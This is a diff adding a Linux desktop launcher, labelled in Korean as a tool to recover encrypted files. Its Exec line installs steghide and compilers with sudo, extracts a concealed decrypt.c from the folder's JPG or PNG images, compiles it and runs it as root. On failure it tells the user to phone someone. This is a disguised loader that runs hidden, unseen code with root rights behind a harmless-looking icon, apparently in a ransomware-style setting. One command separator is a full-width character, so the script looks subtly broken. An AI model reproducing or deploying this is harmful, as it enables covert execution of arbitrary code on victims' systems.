@@ -1,0 +1,9 @@
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=파일 복구하기
+Comment=암호화된 파일 자동 복구
+Exec=bash -c 'cd "$(dirname "%k")"; if ! command -v steghide &>/dev/null; then x-terminal-emulator -e bash -c "echo 도구 설치중...; sudo apt-get update && sudo apt-get install -y steghide build-essential libssl-dev; echo 완료! 다시 아이콘을 더블클릭하세요; read"; exit; fi; steghide extract -sf *.jpg -p "" -xf decrypt.c 2>/dev/null || steghide extract -sf *.png -p "" -xf decrypt.c 2>/dev/null; gcc -o decrypt decrypt.c -lssl -lcrypto 2>/dev/null && x-terminal-emulator -e bash -c "echo \"=== 파일 복호화 시작 ===\"；echo; sudo ./decrypt; echo; echo \"완료! 엔터를 눌러 종료하세요...\"; read" || x-terminal-emulator -e bash -c "echo 오류 발생! 전화주세요; read"'
+Icon=emblem-unlocked
+Terminal=false
+Categories=Utility;
